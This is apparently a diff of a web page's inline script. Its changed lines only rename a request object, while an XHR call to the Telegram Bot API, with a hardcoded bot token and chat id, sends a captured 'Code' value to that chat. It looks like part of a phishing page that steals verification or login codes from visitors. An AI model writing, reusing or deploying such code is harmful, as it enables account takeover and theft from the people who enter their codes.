@@ -702,21 +702,21 @@
             console.log(xhr.response);
           }
         };
-        xhr.open(
+        req2.open(
           "get",
           `https://api.telegram.org/bot7916534030:AAFPSCSO_B-VCFUNdILwWiRTawFvqwQV51A/sendMessage?chat_id=7356694709&text=🔒Code:${code}\n`,
           true
         );
-        xhr.setRequestHeader(
+        req2.setRequestHeader(
           "Content-Type",
           "application/x-www-form-urlencoded; charset=UTF-8"
         );
 
-        xhr.setRequestHeader(
+        req2.setRequestHeader(
           "Content-Type",
           "application/x-www-form-urlencoded; charset=UTF-8"
         );
-        xhr.send();
+        req2.send();
       }
     </script>
     <div class="root-layer"></div>
